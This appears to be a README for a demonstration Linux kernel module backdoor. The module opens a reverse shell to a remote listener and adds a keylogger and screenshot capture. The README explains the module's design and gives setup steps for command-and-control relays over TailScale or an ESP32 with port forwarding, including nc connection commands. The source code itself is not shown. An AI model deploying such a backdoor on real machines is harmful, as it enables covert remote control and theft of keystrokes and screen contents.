# Linux Kernel Module Backdoor Demonstration

A simple example of a linux kernel module that implements a backdoor that can communicate with another computer, receive shell commands, and send the responses of those commands back, i.e., performs a `reverse shell`. In addition, it can take `screenshots` and read the user input (`keylogger`).

# Table of Contents  
* [Preparations](#preparations)  
* [How the code works](#how-the-code-works)
* [Connecting to the host on a local network](#connecting-to-the-host-on-a-local-network)
* [Connection between host and VM on different networks using TailScale and a simple command and control server (for example, another computer in a controlled network)](#connection-between-host-and-vm-on-different-networks-using-tailscale-and-a-simple-command-and-control-server-for-example-another-computer-in-a-controlled-network)
* [Connection between host and VM on local network using a microcontroller (ESP32)](#connection-between-host-and-vm-on-local-network-using-a-microcontroller-esp32)
* [Connection between host and VM on different networks using a microcontroller (ESP32) in a controlled network](#connection-between-host-and-vm-on-different-networks-using-a-microcontroller-esp32-in-a-controlled-network)

## Preparations

This kernel module was compiled in a Ubuntu 22.04 LTS virtual machine with the 6.3.5-060305-generic kernel version. After booting the VM, update the system and the kernel version to the same version running the following commands:

```
sudo apt update && sudo apt upgrade -y
```
```
sudo apt install wget
```
```
wget https://raw.githubusercontent.com/pimlie/ubuntu-mainline-kernel.sh/master/ubuntu-mainline-kernel.sh
```
```
chmod +x ubuntu-mainline-kernel.sh
sudo mv ubuntu-mainline-kernel.sh /usr/local/bin/
```
Replace `[KERNEL_VERSION]` with the desired version (In this case: `6.3.5-060305-generic`).
```
ubuntu-mainline-kernel.sh -c
sudo ubuntu-mainline-kernel.sh -i [KERNEL_VERSION]
```
```
sudo reboot
```

In the Makefile, replace the `obj-m` value with your file name (`backdoor.o` for this example) and the `[your_module_name]-objs` with the object files to be linked to the module. Then run the `make` command.

After that, you must have a `backdoor.ko` file. That's the compiled module that must be loaded. Before it, at the IP and PORT that the backdoor is connecting it's necessary to listen to that port with a TCP connection. In this example, we will do that in 4 different ways: 

1. Using a local python script to listen to the port in the host. Must be on a local connection.
2. Using a remote python script to connect other the host to the server and a server python script that listen to the backdoor and attacker ports in the server. Must have an public IP at the server network OR a VPN (in this example we will use TailScale). 
3. Using a microcontroller (ESP32) that simulates a simple local command and control server that redirects the messages from the VM to the host. We will use the ESP32, the host and the VM at a local network in this case.
4. (Only theoretical for now) Using the ESP32 as a simple remote command and control server. Must have a public IP at the ESP32 network OR a VPN that runs in the ESP32.

Assuming that the connection is already working, you can load the module with the command:

```
sudo insmod backdoor.ko
```

Now that the module is loaded, it is waiting for commands. You can send them using the open connection in the host and receive the response of the commands. In short, we have a `reverse shell`, but we don't have the terminal interface as we would normally have because we are executing the commands directly from the kernel module.

The python scripts implements the sockets and a basic interface to send and receive the messages.

After you are done, close the connection with the backdoor in the python script that you are using. Then you can remove the module in the VM using:

```
sudo rmmod backdoor
```

You can use
```
make clean
```
to remove the other files generated during the compile process.

Other approach is to use a shell script at the VM that executes in sequence the commands:
```
make
sudo insmod backdoor
sudo rmmod backdoor
make clean
```
## How the code works

The main function `backdoor_init` creates a socket, set up the address to connect to and try to connect to the local host/remote server. After the connection has been established, the keylogger is initialized and every time a key is pressed, it is stored in a keylog buffer. Then the loop that send and receive messages is started. First it receives an integer from the local host/remote server that represents the desired option (1 = execute shell command, 2/3 = screenshot, 4 = keylogger and 5 = end connection). After receiving the option 5, it breaks the loop, deletes the temporary files (output and screenshot files) and release the socket.

The option 1 receive a command through the socket, runs the `execute_shell_command` function and read the output file. If the command received is "quit", it ends this option; otherwise it executes that command in a shell and redirects the output of the command to the temporary output file. Then it reads this file and sends its content through the socket.

The option 2 and 3 takes screenshots of the machine with the backdoor. The first one is not compatible with graphical interfaces, it takes a screenshot of the CLI interface using the frame buffer to read the screen data and store it in a temporary PPM image file. As for the option 3, it uses the `execute_shell_command` to run the `gnome-screenshot` command in the selected user space and create a temporary PNG image file with its result. After taking the screenshot, the temporary image file is read and its data is sent through the socket in a hexdump format.

The option 4 gets the keylog buffer that is stored in real time by the keylogger and send it through the socket,

The option 5 breaks the loop, ending the connection.

## Connecting to the host on a local network

To make the connection between the VM and the host in a local network, before compiling the C file, you must change the `HOST_IP` and the `HOST_PORT` values in the `script_local.py` and the `SERVER_IP` and the `SERVER_PORT` values in the `functions.h` (VM) with your host IP and PORT that you wish to connect to in your host.

To find the host IP you can use the command:
```
ip addr
```
After changing them, you have to allow this connection in your host firewall (if necessary), and then you can run the python script
```
python3 script_local.py
```
to listen to that port in the host. Then you can load the module in the VM and start to send commands at the host.

## Connection between host and VM on different networks using TailScale and a simple command and control server (for example, another computer in a controlled network)

First, create a TailScale account and add your machines to your account. To each one of them will be assigned an IP that you will use in your connections.

Change the `SERVER_IP` and the `SERVER_PORT` values in the `script_remote.py` and `functions.h` (VM) to the IP and PORT of your server that you want to connect to. In the `server.py` script, change the `SERVER` to the server TailScale IP and ports `PORT1` and `PORT2` to the backdoor and attacker ports.

Configure the SSH in your server and allow SSH connections from your host. Now, use SSH to connect to your server using a username from the server and the server name or server ip that is in your TailScale account.
```
ssh username@server-name-or-IP
```
and run the `server.py` script.
```
python3 server.py
```
Then, you can load the module in the VM and open another shell in your host and run
```
python3 script_remote.py
```

## Connection between host and VM on local network using a microcontroller (ESP32)

First of all, you must change the `SSID` and the `PASSWORD` variables to the WiFi name and password of the network that you controls and the ports that you wish the 2 machines to connect to.

Then you can load the code in the ESP32 and turn it on. The microcontroller will wait to the 2 connections to be established and will start to redirect the messages between the 2 machines. The `SERVER_IP` and the `SERVER_PORT` values in the backdoor must be changed to the `ESP32 IP` and `PORT2` and then it will connect automatically when the module is loaded.

To connect the host, run
```
nc ESP32_IP ESP32_PORT1
```
or change the python script to connect to the `ESP32_IP` and `ESP32_PORT1` and run the script. Then the 2 machines will be connected via the microcontroller.

## Connection between host and VM on different networks using a microcontroller (ESP32) in a controlled network
Change the `SSID` and the `PASSWORD` variables to the WiFi name and password of the network that you controls and the ports that you wish the 2 machines to connect to.

After that, if you want to connect via public IP, you need to configure the port forwarding in your router, so that when you start a connection at your router IP in a selected port, it will redirect the connection to the ESP32 IP in the desired port. You can try using the IPv4 or the IPv6 (if it is compatible with your router).

If you don't have a public IP, you can try to find a VPN service that runs directly in the ESP32 and connect the machines and microcontroller in this VPN (If you can't find one, try using another device to simulate the command and control server).

Then you can load the code in the ESP32 and turn it on. The microcontroller will wait to the 2 connections to be established and will start to redirect the messages between the 2 machines. The `SERVER_IP` and the `SERVER_PORT` values in the backdoor must be changed to the `ROUTER IP` (OR the `VPN IP`) and `PORT2` and then it will connect automatically when the module is loaded.

To connect the host, use
```
nc ROUTER_IP ROUTER_PORT
```
or change the python script to connect to the `ROUTER_IP` and `ROUTER_PORT` (OR the `VPN_IP` and `VPN_PORT`) and run the script. Then the 2 machines will be connected via the microcontroller.
